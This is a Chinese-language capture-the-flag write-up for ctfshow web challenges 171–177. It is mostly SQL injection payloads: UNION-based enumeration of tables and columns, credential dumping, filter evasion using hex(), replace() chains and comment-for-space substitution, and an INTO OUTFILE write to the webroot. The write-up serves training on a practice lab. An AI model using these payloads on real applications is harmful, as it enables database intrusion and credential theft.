### web171

> 函数 group_concat(arg) 可以合并多行的某列(或多列)数据为一行，默认以逗号分隔。

拼接sql语句查找指定ID用户

`$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";`

```
1' or 1=1--+
```

判断字段数

```
1' order by 3--+
1' order by 4--+
```

```
1' union select 1,2,3 --+
```

3个均有回显

```
1' union select database(),2,3 --+
```

`ctfshow_web`

```
1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='ctfshow_web'--+
```

```
1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='ctfshow_user'--+
```

```
1' union select 1,group_concat(username,password),3 from ctfshow_user --+
```

### web172

```
1' union select database(),group_concat(username,password) from ctfshow_user2 --+--+
```

### web173

```
//检查结果是否有flag
    if(!preg_match('/flag/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

使用`hex()`编码进行桡过

```
1' union select database(),group_concat(hex(password)),3 from ctfshow_user3 --+
```

### web174

```
-1' union select replace(username,'g','j'),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J'),'g','j') from ctfshow_user4 where username='flag'--+
```

### web175

```
//检查结果是否有flag
    if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

过滤了ascii 0~127

直接写文件

```
1' union select 1,password from ctfshow_user5 into outfile "/var/www/html/flag"--+	
```

### web176

```
1' or 1=1--+
```

万能密码就行

### web177

过滤了空格和`--+`,`#`

```
1'/**/order/**/by/**/3%23
1'/**/union/**/select/**/1,2,3%23

1'/**/union/**/select/**/database(),group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema='ctfshow_web'%23

1'/**/union/**/select/**/database(),group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name='ctfshow_user'%23

1'/**/union/**/select/**/database(),group_concat(username,password),3/**/from/**/ctfshow_user%23
```

